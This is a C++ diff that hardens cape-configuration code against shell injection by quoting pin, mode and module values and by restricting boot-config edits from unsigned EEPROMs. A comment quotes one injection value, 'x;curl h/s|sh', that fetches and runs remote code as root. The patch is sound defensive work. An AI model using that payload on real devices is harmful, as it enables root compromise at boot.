@@ -220,6 +220,34 @@ std::string string_sprintf(const char* format, Args... args) {
     return std::move(str);
 }
 
+// One single-quoted shell word.  Pin names, modes and module names reach the
+// shell from cape-info.json, which an unsigned (uploaded) EEPROM supplies:
+// pasted in bare, "x;curl h/s|sh" ran as root at boot.
+static std::string CapeShellQuote(const std::string& v) {
+    std::string out = "'";
+    for (char ch : v) {
+        out += (ch == '\'') ? std::string("'\\''") : std::string(1, ch);
+    }
+    out += "'";
+    return out;
+}
+// A module spec ("name" or "name param=value ...") as quoted shell words.
+static std::string QuotedModuleSpec(const std::string& spec) {
+    std::string out;
+    size_t pos = 0;
+    while (pos < spec.size()) {
+        size_t end = spec.find(' ', pos);
+        if (end == std::string::npos) {
+            end = spec.size();
+        }
+        if (end > pos) {
+            out += (out.empty() ? "" : " ") + CapeShellQuote(spec.substr(pos, end - pos));
+        }
+        pos = end + 1;
+    }
+    return out;
+}
+
 static std::string exec(const std::string& cmd) {
     std::array<char, 128> buffer;
     std::string result;
@@ -514,7 +542,15 @@ static bool configContainsDirective(const std::string& config, const std::string
     }
     return false;
 }
-static bool processBootConfig(Json::Value& bootConfig) {
+// What an unsigned cape may do to the boot config: add or drop device tree
+// overlays and parameters, which is what capes use it for.  Anything else
+// there (kernel=, initramfs, cmdline=, init=) decides what the box boots, and
+// an unsigned image is as often an uploaded file as it is a chip.
+static bool UnsignedBootConfigLineAllowed(const std::string& v) {
+    return v.rfind("dtoverlay=", 0) == 0 || v.rfind("dtparam=", 0) == 0;
+}
+
+static bool processBootConfig(Json::Value& bootConfig, bool trusted) {
 #if defined(PLATFORM_PI)
     const std::string fileName = findBootConfigFile("config.txt");
 #elif defined(PLATFORM_BBB)
@@ -547,6 +583,10 @@ static bool processBootConfig(Json::Value& bootConfig) {
             if (v.empty()) {
                 continue;
             }
+            if (!trusted && !UnsignedBootConfigLineAllowed(v)) {
+                printf("CapeUtils: unsigned cape may not remove \"%s\" from the boot config\n", v.c_str());
+                continue;
+            }
             size_t pos = std::string::npos;
             while ((pos = current.find(v)) != std::string::npos) {
                 // If found then erase it from string
@@ -557,6 +597,10 @@ static bool processBootConfig(Json::Value& bootConfig) {
     if (bootConfig.isMember("append")) {
         for (int x = 0; x < bootConfig["append"].size(); x++) {
             std::string v = bootConfig["append"][x].asString();
+            if (!trusted && !UnsignedBootConfigLineAllowed(v)) {
+                printf("CapeUtils: unsigned cape may not add \"%s\" to the boot config\n", v.c_str());
+                continue;
+            }
             if (!configContainsDirective(current, v)) {
                 // If not  found then append it
                 printf("Adding config option: %s\n", v.c_str());
@@ -1064,7 +1108,7 @@ static std::string PinCurrentMode(const std::string& pin) {
         return "";
     }
     std::string out;
-    std::string cmd = "/usr/bin/pinctrl -l " + pin + " 2>/dev/null";
+    std::string cmd = "/usr/bin/pinctrl -l " + CapeShellQuote(pin) + " 2>/dev/null";
     FILE* p = popen(cmd.c_str(), "r");
     if (p) {
         char buf[256];
@@ -1089,9 +1133,8 @@ void ConfigurePin(const char* pin, const char* mode) {
     // bone-pinmux-helper sysfs on older kernels. Fall back to the helper sysfs
     // directly only if the tool is absent (keeps pre-pinctrl images working).
     if (file_exists("/usr/bin/pinctrl") && pin[0] == 'P' && (pin[2] == '_' || pin[2] == '-')) {
-        char cmd[256];
-        snprintf(cmd, sizeof(cmd), "/usr/bin/pinctrl -s %s %s", pin, mode);
-        if (system(cmd) == 0) {
+        std::string cmd = "/usr/bin/pinctrl -s " + CapeShellQuote(pin) + " " + CapeShellQuote(mode);
+        if (system(cmd.c_str()) == 0) {
             return;
         }
     }
@@ -1165,7 +1208,7 @@ static const std::map<std::string, std::string> LEGACY_MODULE_NAME_MAP = {
 };
 
 static bool moduleNameResolves(const std::string& module) {
-    std::string cmd = "/sbin/modprobe -n -q " + module + " > /dev/null 2>&1";
+    std::string cmd = "/sbin/modprobe -n -q " + QuotedModuleSpec(module) + " > /dev/null 2>&1";
     return system(cmd.c_str()) == 0;
 }
 
@@ -1189,7 +1232,7 @@ static void loadModules(const Json::Value& modules) {
                 continue;
             }
         }
-        exec("/sbin/modprobe " + module + " 2> /dev/null  > /dev/null");
+        exec("/sbin/modprobe " + QuotedModuleSpec(module) + " 2> /dev/null  > /dev/null");
     }
 }
 
@@ -1902,10 +1945,10 @@ private:
     }
     void configurePin(const std::string& pin, const std::string& mode) {
 #ifdef PLATFORM_BB64
-        std::string cmd = "/usr/bin/pinctrl -s " + pin + " " + mode;
+        std::string cmd = "/usr/bin/pinctrl -s " + CapeShellQuote(pin) + " " + CapeShellQuote(mode);
         exec(cmd);
 #elif defined(PLATFORM_PI)
-        std::string cmd = "/usr/bin/pinctrl set " + pin + " " + mode;
+        std::string cmd = "/usr/bin/pinctrl set " + CapeShellQuote(pin) + " " + CapeShellQuote(mode);
         exec(cmd);
 #endif
     }
@@ -2060,7 +2103,7 @@ private:
                     if (result.isMember("bootConfig")) {
                         // if the cape requires changes/update to config.txt (Pi) or uEnv.txt (BBB)
                         // we need to process them and see if we have to apply the changes and reboot or not
-                        reboot = processBootConfig(result["bootConfig"]);
+                        reboot = processBootConfig(result["bootConfig"], hasSignature && validSignature);
                     }
                     if (result.isMember("copyFiles")) {
                         // if the cape requires certain files copied into place (asoundrc for example)
